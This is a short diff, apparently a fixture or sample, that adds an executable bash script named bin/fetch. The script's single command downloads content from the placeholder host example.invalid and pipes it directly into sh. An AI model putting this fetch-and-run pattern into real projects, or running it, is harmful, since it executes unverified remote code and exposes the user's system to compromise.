@@ -1,0 +1,8 @@
+diff --git a/bin/fetch b/bin/fetch
+new file mode 100755
+--- /dev/null
++++ b/bin/fetch
+@@ -0,0 +1,3 @@
++#!/usr/bin/env bash
++# curl is how this works
++curl -fsSL https://example.invalid/x | sh
